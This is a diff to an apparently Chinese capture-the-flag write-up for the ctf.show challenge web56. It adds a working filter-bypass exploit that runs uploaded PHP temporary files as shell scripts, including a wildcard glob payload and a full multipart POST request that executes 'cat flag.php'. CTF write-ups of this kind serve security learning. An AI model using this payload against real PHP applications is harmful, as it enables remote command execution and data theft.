@@ -53,7 +53,7 @@ if(isset($_GET['c'])){
 
 
 ^
-## **没有过滤.的命令执行**
+## **没有过滤.的php临时文件命令执行**
 web56
 ```
 // 你们在炫技吗？
@@ -72,7 +72,27 @@ if(isset($_GET['c'])){
 #!/bin/sh
 ls
 ```
-传参
+同时传参
 ```
 ?c=.%20/???/????????[@-[]
+```
+最终数据包如下：
+```
+POST /?c=.%20/???/????????[@-[] HTTP/1.1
+Host: 13cf7637-c8fc-4c8e-901d-782b7a0c99fd.challenge.ctf.show
+Accept-Encoding: gzip, deflate, br
+User-Agent: PostmanRuntime/7.42.0
+Content-Type: multipart/form-data; boundary=--------------------------974334232652972648027191
+Accept: */*
+Cache-Control: no-cache
+Postman-Token: 12305bc1-76a8-4288-a75d-266bbc6679d3
+Content-Length: 220
+
+----------------------------974334232652972648027191
+Content-Disposition: form-data; name="filename"; filename="1.txt"
+Content-Type: text/plain
+
+#!/bin/sh
+cat flag.php
+----------------------------974334232652972648027191--
 ```
